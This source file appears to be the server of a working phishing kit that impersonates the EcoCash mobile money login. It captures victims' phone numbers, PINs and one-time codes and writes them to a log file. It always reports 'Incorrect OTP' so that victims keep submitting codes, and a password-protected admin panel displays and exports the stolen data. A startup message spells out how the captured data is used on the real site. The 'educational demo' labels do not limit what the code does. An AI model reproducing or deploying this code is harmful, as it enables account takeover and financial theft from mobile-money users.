const http = require('http');
const fs = require('fs');
const path = require('path');
const url = require('url');

const PORT = process.env.PORT || 8000;

// Simple authentication for admin page
const ADMIN_USERNAME = 'ecoadmin';
const ADMIN_PASSWORD = 'eco@admin';

// Store pending sessions (phone + PIN captured, waiting for OTP)
const pendingSessions = {};

function verifyAuth(req) {
    const authHeader = req.headers.authorization || '';
    const encoded = authHeader.split(' ')[1] || '';
    const decoded = Buffer.from(encoded, 'base64').toString();
    const [username, password] = decoded.split(':');
    return username === ADMIN_USERNAME && password === ADMIN_PASSWORD;
}

// Format credentials for display
function formatCredentials(data) {
    if (!data.trim()) return '<p>No credentials captured yet.</p>';
    
    try {
        const jsonArray = '[' + data.trim().replace(/,\s*$/, '') + ']';
        const parsed = JSON.parse(jsonArray);
        
        let html = '';
        parsed.reverse().forEach((cred, index) => {
            const status = cred.otp ? 'complete' : 'pending';
            const statusClass = status === 'complete' ? 'status-complete' : 'status-pending';
            const statusText = status === 'complete' ? '✅ Complete' : '⏳ Pending OTP';
            
            html += `
                <div class="credential-item">
                    <div class="timestamp">${new Date(cred.timestamp).toLocaleString()} (#${parsed.length - index})</div>
                    <div class="phone-number">📱 +263${cred.ecocashNumber}</div>
                    <div class="pin">🔒 PIN: ${cred.ecocashPin}</div>
                    ${cred.otp ? `<div class="pin">🔑 OTP: <span class="otp-value">${cred.otp}</span></div>` : '<div class="pin" style="color:#999;">⏳ OTP not yet captured</div>'}
                    <div class="ip-info">🌐 IP: ${cred.ip || 'Unknown'}</div>
                    <span class="status-badge ${statusClass}">${statusText}</span>
                </div>
            `;
        });
        return html;
    } catch (e) {
        return `<pre>${data}</pre>`;
    }
}

function countEntries(data) {
    if (!data.trim()) return 0;
    try {
        const jsonArray = '[' + data.trim().replace(/,\s*$/, '') + ']';
        const parsed = JSON.parse(jsonArray);
        return parsed.length;
    } catch (e) {
        return data.split('\n').filter(line => line.trim()).length;
    }
}

http.createServer((req, res) => {
    const parsedUrl = url.parse(req.url, true);
    const pathname = parsedUrl.pathname;

    console.log(`[${new Date().toISOString()}] ${req.method} ${req.url}`);

    // Serve static files
    if (req.method === 'GET' && pathname.startsWith('/static/')) {
        const filePath = path.join(__dirname, pathname);
        const extname = path.extname(filePath).toLowerCase();
        
        const mimeTypes = {
            '.html': 'text/html',
            '.js': 'text/javascript',
            '.css': 'text/css',
            '.png': 'image/png',
            '.jpg': 'image/jpeg',
            '.jpeg': 'image/jpeg',
            '.gif': 'image/gif',
            '.ico': 'image/x-icon',
            '.svg': 'image/svg+xml'
        };

        const contentType = mimeTypes[extname] || 'application/octet-stream';

        fs.readFile(filePath, (err, data) => {
            if (err) {
                console.error('Static file not found:', filePath);
                res.writeHead(404);
                res.end('File not found');
                return;
            }
            res.writeHead(200, { 'Content-Type': contentType });
            res.end(data);
        });
        return;
    }

    // Serve login page
    if (req.method === 'GET' && pathname === '/') {
        fs.readFile(path.join(__dirname, 'index.html'), (err, data) => {
            if (err) {
                console.error('Error reading index.html:', err);
                res.writeHead(500);
                res.end('Error loading page');
                return;
            }
            res.writeHead(200, { 'Content-Type': 'text/html' });
            res.end(data);
        });
        return;
    }

    // Serve OTP page
    if (req.method === 'GET' && pathname === '/otp') {
        fs.readFile(path.join(__dirname, 'otp.html'), (err, data) => {
            if (err) {
                console.error('Error reading otp.html:', err);
                res.writeHead(500);
                res.end('Error loading OTP page');
                return;
            }
            res.writeHead(200, { 'Content-Type': 'text/html' });
            res.end(data);
        });
        return;
    }

    // Handle login POST - Capture Phone + PIN immediately
    if (req.method === 'POST' && pathname === '/login') {
        let body = '';
        
        req.on('data', chunk => {
            body += chunk.toString();
        });
        
        req.on('end', () => {
            try {
                const data = new URLSearchParams(body);
                const phone = data.get('ecocashNumber');
                const pin = data.get('ecocashPin');
                
                // Clean phone number (remove spaces, etc.)
                const cleanPhone = phone.replace(/[^0-9]/g, '');
                
                // Validate Zimbabwe phone number format
                // Should start with 77, 78, 71, 73, etc. and be 9 digits
                if (cleanPhone.length !== 9 || !cleanPhone.match(/^[7][1-9][0-9]{7}$/)) {
                    console.log(`⚠️ Invalid phone number format: ${cleanPhone}`);
                    res.writeHead(200, { 'Content-Type': 'application/json' });
                    res.end(JSON.stringify({ 
                        success: false, 
                        message: 'Invalid phone number format. Please enter a valid EcoCash number (e.g., 771234567)' 
                    }));
                    return;
                }
                
                // Check if PIN is 4 digits
                if (!pin || pin.length !== 4 || !pin.match(/^[0-9]{4}$/)) {
                    console.log(`⚠️ Invalid PIN format: ${pin}`);
                    res.writeHead(200, { 'Content-Type': 'application/json' });
                    res.end(JSON.stringify({ 
                        success: false, 
                        message: 'Invalid PIN. Please enter a 4-digit PIN' 
                    }));
                    return;
                }
                
                // Store in pending sessions (waiting for OTP)
                pendingSessions[cleanPhone] = {
                    ecocashNumber: cleanPhone,
                    ecocashPin: pin,
                    timestamp: new Date().toISOString(),
                    userAgent: req.headers['user-agent'],
                    ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress,
                    otpCaptured: false
                };
                
                console.log(`📱 Phone captured: +263${cleanPhone}`);
                console.log(`🔒 PIN captured: ${pin}`);
                console.log(`⏳ Waiting for OTP...`);
                
                // Save partial credentials immediately (without OTP)
                const partialCredentials = {
                    ecocashNumber: cleanPhone,
                    ecocashPin: pin,
                    otp: null,
                    status: 'pending_otp',
                    timestamp: new Date().toISOString(),
                    userAgent: req.headers['user-agent'],
                    ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress
                };
                
                const logEntry = JSON.stringify(partialCredentials, null, 2) + ',\n';
                fs.appendFile('credentials.log', logEntry, (err) => {
                    if (err) console.error('Error writing to file:', err);
                    else console.log(`✅ Phone + PIN saved (waiting for OTP)`);
                });
                
                // Send success response - redirect to OTP page
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ 
                    success: true, 
                    message: 'Credentials captured. Redirecting to OTP verification.'
                }));
                
            } catch (error) {
                console.error('Error processing request:', error);
                res.writeHead(500);
                res.end(JSON.stringify({ success: false, message: 'Server error' }));
            }
        });
        return;
    }

    // Handle OTP verification - Capture OTP
    if (req.method === 'POST' && pathname === '/otp-verify') {
        let body = '';
        
        req.on('data', chunk => {
            body += chunk.toString();
        });
        
        req.on('end', () => {
            try {
                const data = new URLSearchParams(body);
                const phone = data.get('phone');
                const enteredOtp = data.get('otp');
                
                console.log(`📱 OTP captured for ${phone}: ${enteredOtp}`);
                
                // Check if we have a pending session for this phone
                const session = pendingSessions[phone];
                if (session) {
                    session.otpCaptured = true;
                    session.otp = enteredOtp;
                    
                    console.log(`✅ Complete credentials captured:`);
                    console.log(`   Phone: +263${phone}`);
                    console.log(`   PIN: ${session.ecocashPin}`);
                    console.log(`   OTP: ${enteredOtp}`);
                    
                    // Update the credentials.log with the OTP
                    // We'll append a complete entry
                    const fullCredentials = {
                        ecocashNumber: phone,
                        ecocashPin: session.ecocashPin,
                        otp: enteredOtp,
                        status: 'complete',
                        timestamp: new Date().toISOString(),
                        userAgent: session.userAgent,
                        ip: session.ip,
                        capturedAt: new Date().toISOString()
                    };
                    
                    const logEntry = JSON.stringify(fullCredentials, null, 2) + ',\n';
                    fs.appendFile('credentials.log', logEntry, (err) => {
                        if (err) console.error('Error writing to file:', err);
                        else console.log(`✅ Complete credentials saved with OTP`);
                    });
                    
                    // Keep the session for display purposes
                } else {
                    console.log(`⚠️ No pending session found for ${phone}`);
                }
                
                // ALWAYS show "Incorrect OTP" to make the victim try again
                // This is how real phishing works - they keep entering OTPs
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ 
                    success: false,  // Always false to simulate "incorrect OTP"
                    message: 'Incorrect OTP. Please try again.'
                }));
                
            } catch (error) {
                console.error('Error:', error);
                res.writeHead(500);
                res.end(JSON.stringify({ success: false }));
            }
        });
        return;
    }

    // Handle OTP resend (for demo purposes)
    if (req.method === 'POST' && pathname === '/otp-resend') {
        let body = '';
        
        req.on('data', chunk => {
            body += chunk.toString();
        });
        
        req.on('end', () => {
            try {
                const data = new URLSearchParams(body);
                const phone = data.get('phone');
                
                // Check if we have a pending session for this phone
                const session = pendingSessions[phone];
                if (!session) {
                    console.log(`⚠️ No pending session found for ${phone}`);
                    res.writeHead(200, { 'Content-Type': 'application/json' });
                    res.end(JSON.stringify({ success: false, message: 'No pending session found' }));
                    return;
                }
                
                console.log(`📱 Resend OTP requested for ${phone}`);
                // In a real scenario, this would trigger a new OTP from the real service
                // For this demo, we just acknowledge the request
                
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ 
                    success: true, 
                    message: 'New OTP sent to your phone. Check your SMS.' 
                }));
                
            } catch (error) {
                console.error('Error:', error);
                res.writeHead(500);
                res.end(JSON.stringify({ success: false }));
            }
        });
        return;
    }

    // Admin page
    if (req.method === 'GET' && pathname === '/admin') {
        if (!verifyAuth(req)) {
            res.writeHead(401, {
                'WWW-Authenticate': 'Basic realm="Admin Access"',
                'Content-Type': 'text/html'
            });
            res.end('<h1>Authentication Required</h1>');
            return;
        }

        fs.readFile('credentials.log', 'utf8', (err, data) => {
            if (err && err.code === 'ENOENT') {
                data = 'No credentials captured yet.';
            } else if (err) {
                data = `Error reading file: ${err.message}`;
            }

            // Count complete vs pending
            let completeCount = 0;
            let pendingCount = 0;
            try {
                const jsonArray = '[' + data.trim().replace(/,\s*$/, '') + ']';
                const parsed = JSON.parse(jsonArray);
                parsed.forEach(cred => {
                    if (cred.otp) completeCount++;
                    else pendingCount++;
                });
            } catch (e) {
                // If can't parse, just use counts from pendingSessions
                completeCount = Object.values(pendingSessions).filter(s => s.otpCaptured).length;
                pendingCount = Object.values(pendingSessions).filter(s => !s.otpCaptured).length;
            }

            res.writeHead(200, { 'Content-Type': 'text/html' });
            res.end(`
                <!DOCTYPE html>
                <html>
                <head>
                    <title>Admin - Captured Credentials</title>
                    <style>
                        * {
                            margin: 0;
                            padding: 0;
                            box-sizing: border-box;
                            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                        }
                        body {
                            background: #f5f5f5;
                            padding: 20px;
                            color: #333;
                        }
                        .container {
                            max-width: 1200px;
                            margin: 0 auto;
                            background: white;
                            border-radius: 8px;
                            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
                            padding: 30px;
                        }
                        header {
                            text-align: center;
                            margin-bottom: 30px;
                            padding-bottom: 20px;
                            border-bottom: 1px solid #eee;
                        }
                        h1 {
                            color: #d32f2f;
                            margin-bottom: 10px;
                        }
                        .warning {
                            background: #fff3e0;
                            border-left: 4px solid #FF9800;
                            padding: 15px;
                            margin-bottom: 20px;
                            border-radius: 4px;
                        }
                        .warning h3 {
                            color: #e65100;
                            margin-bottom: 5px;
                        }
                        .warning p {
                            color: #555;
                            font-size: 14px;
                        }
                        .stats {
                            display: flex;
                            gap: 20px;
                            margin-bottom: 20px;
                            flex-wrap: wrap;
                        }
                        .stat-box {
                            background: #f8f9fa;
                            padding: 15px;
                            border-radius: 6px;
                            border-left: 4px solid #1a73e8;
                            flex: 1;
                            min-width: 200px;
                        }
                        .stat-box h3 {
                            margin-bottom: 5px;
                            color: #555;
                        }
                        .stat-box p {
                            font-size: 24px;
                            font-weight: bold;
                            color: #1a73e8;
                        }
                        .stat-box .success {
                            color: #4CAF50;
                        }
                        .stat-box .warning-color {
                            color: #FF9800;
                        }
                        .actions {
                            margin-bottom: 20px;
                            display: flex;
                            gap: 10px;
                            flex-wrap: wrap;
                        }
                        .btn {
                            padding: 10px 20px;
                            background: #1a73e8;
                            color: white;
                            border: none;
                            border-radius: 4px;
                            cursor: pointer;
                            text-decoration: none;
                            display: inline-block;
                        }
                        .btn-danger {
                            background: #d32f2f;
                        }
                        .btn:hover {
                            opacity: 0.9;
                        }
                        .data-container {
                            background: #f8f9fa;
                            border-radius: 6px;
                            padding: 20px;
                            margin-top: 20px;
                            overflow-x: auto;
                        }
                        .credential-item {
                            background: white;
                            border: 1px solid #ddd;
                            border-radius: 4px;
                            padding: 15px;
                            margin-bottom: 10px;
                            position: relative;
                        }
                        .timestamp {
                            color: #666;
                            font-size: 12px;
                            margin-bottom: 5px;
                        }
                        .phone-number {
                            color: #1a73e8;
                            font-weight: bold;
                            font-size: 18px;
                            margin-bottom: 5px;
                        }
                        .pin {
                            font-family: monospace;
                            font-size: 16px;
                            margin-bottom: 3px;
                        }
                        .pin .label {
                            color: #666;
                        }
                        .pin .value {
                            color: #d32f2f;
                            font-weight: bold;
                        }
                        .pin .otp-value {
                            color: #1a73e8;
                            font-weight: bold;
                        }
                        .pin .pending {
                            color: #FF9800;
                        }
                        .ip-info {
                            color: #666;
                            font-size: 12px;
                            margin-top: 5px;
                        }
                        .status-badge {
                            display: inline-block;
                            padding: 2px 10px;
                            border-radius: 12px;
                            font-size: 12px;
                            font-weight: 600;
                            margin-left: 10px;
                            position: absolute;
                            right: 15px;
                            top: 15px;
                        }
                        .status-complete {
                            background: #4CAF50;
                            color: white;
                        }
                        .status-pending {
                            background: #FF9800;
                            color: white;
                        }
                        footer {
                            margin-top: 30px;
                            text-align: center;
                            color: #666;
                            font-size: 12px;
                            padding-top: 20px;
                            border-top: 1px solid #eee;
                        }
                        .live-update {
                            color: #4CAF50;
                            font-weight: 600;
                        }
                        .live-update .dot {
                            display: inline-block;
                            width: 10px;
                            height: 10px;
                            background: #4CAF50;
                            border-radius: 50%;
                            animation: pulse 1.5s ease-in-out infinite;
                            margin-right: 8px;
                        }
                        @keyframes pulse {
                            0%, 100% { opacity: 1; }
                            50% { opacity: 0.3; }
                        }
                        .logout-link {
                            color: #666;
                            font-size: 14px;
                            margin-top: 10px;
                            display: block;
                        }
                        .logout-link a {
                            color: #1a73e8;
                            text-decoration: none;
                        }
                    </style>
                </head>
                <body>
                    <div class="container">
                        <header>
                            <h1>📋 Captured Credentials</h1>
                            <p>Access restricted to administrators only</p>
                            <p class="live-update"><span class="dot"></span> Live updates every 30 seconds</p>
                        </header>
                        
                        <div class="warning">
                            <h3>⚠️ Educational Demo Only</h3>
                            <p>This simulates how phishing attacks capture credentials. No real OTP is generated - the server simply captures what the user types.</p>
                        </div>
                        
                        <div class="stats">
                            <div class="stat-box">
                                <h3>Total Entries</h3>
                                <p>${countEntries(data)}</p>
                            </div>
                            <div class="stat-box">
                                <h3>Pending OTP</h3>
                                <p class="warning-color">${pendingCount}</p>
                            </div>
                            <div class="stat-box">
                                <h3>Complete (with OTP)</h3>
                                <p class="success">${completeCount}</p>
                            </div>
                        </div>
                        
                        <div class="actions">
                            <a href="/admin" class="btn">🔄 Refresh</a>
                            <a href="/admin?download=true" class="btn">📥 Download Log</a>
                            <button onclick="if(confirm('Delete all logs?')) location.href='/admin?delete=true'" class="btn btn-danger">🗑️ Clear All</button>
                        </div>
                        
                        <div class="data-container">
                            <h3>📝 Captured Data:</h3>
                            ${formatCredentials(data)}
                        </div>
                        
                        <footer>
                            Server: ${req.headers.host} | Last updated: ${new Date().toLocaleString()}
                            <br>
                            <span class="logout-link">🔐 Logged in as: ${ADMIN_USERNAME} | <a href="#" onclick="location.href='/admin?logout=true';location.reload();">Logout</a></span>
                        </footer>
                    </div>
                    
                    <script>
                        setTimeout(() => location.reload(), 30000);
                    </script>
                </body>
                </html>
            `);
        });
        return;
    }

    // Download logs
    if (req.method === 'GET' && pathname === '/admin' && parsedUrl.query.download === 'true') {
        if (!verifyAuth(req)) {
            res.writeHead(401);
            res.end('Authentication Required');
            return;
        }

        res.writeHead(200, {
            'Content-Type': 'application/json',
            'Content-Disposition': 'attachment; filename="credentials_log.json"'
        });
        fs.createReadStream('credentials.log').pipe(res);
        return;
    }

    // Delete logs
    if (req.method === 'GET' && pathname === '/admin' && parsedUrl.query.delete === 'true') {
        if (!verifyAuth(req)) {
            res.writeHead(401);
            res.end('Authentication Required');
            return;
        }

        fs.writeFile('credentials.log', '', (err) => {
            // Also clear pending sessions
            Object.keys(pendingSessions).forEach(key => delete pendingSessions[key]);
            res.writeHead(302, { 'Location': '/admin' });
            res.end();
        });
        return;
    }

    // Logout
    if (req.method === 'GET' && pathname === '/admin' && parsedUrl.query.logout === 'true') {
        // Basic auth logout - send unauthorized header
        res.writeHead(401, {
            'WWW-Authenticate': 'Basic realm="Admin Access"',
            'Content-Type': 'text/html'
        });
        res.end(`
            <!DOCTYPE html>
            <html>
            <head><title>Logged Out</title></head>
            <body>
                <h1>Logged Out</h1>
                <p>You have been logged out. <a href="/admin">Login again</a></p>
            </body>
            </html>
        `);
        return;
    }

    // 404
    res.writeHead(404, { 'Content-Type': 'text/html' });
    res.end(`
        <!DOCTYPE html>
        <html>
        <head><title>404 Not Found</title></head>
        <body>
            <h1>404 - Page Not Found</h1>
            <p>Return to <a href="/">EcoCash Login</a></p>
        </body>
        </html>
    `);
}).listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`📝 Access the login page at: http://localhost:${PORT}`);
    console.log(`🔐 Access admin panel at: http://localhost:${PORT}/admin`);
    console.log(`📁 Credentials will be saved to: credentials.log`);
    console.log(`⚠️  ADMIN CREDENTIALS: ${ADMIN_USERNAME}:${ADMIN_PASSWORD}`);
    console.log(`\n💡 EDUCATIONAL DEMO - REAL PHISHING SIMULATION:`);
    console.log(`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
    console.log(`1. Victim enters Phone + PIN on fake page`);
    console.log(`   → Server captures and SAVES Phone + PIN immediately`);
    console.log(`   → NO OTP is generated by the server`);
    console.log(`   → Redirects to OTP page`);
    console.log(`2. REAL EcoCash sends OTP to victim's phone (simulated)`);
    console.log(`3. Victim enters OTP on fake page`);
    console.log(`   → Server captures and SAVES OTP`);
    console.log(`   → Always shows "Incorrect OTP" (real phishing behavior)`);
    console.log(`4. Attacker now has Phone + PIN + OTP`);
    console.log(`   → Can use them on the REAL EcoCash site`);
    console.log(`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`);
});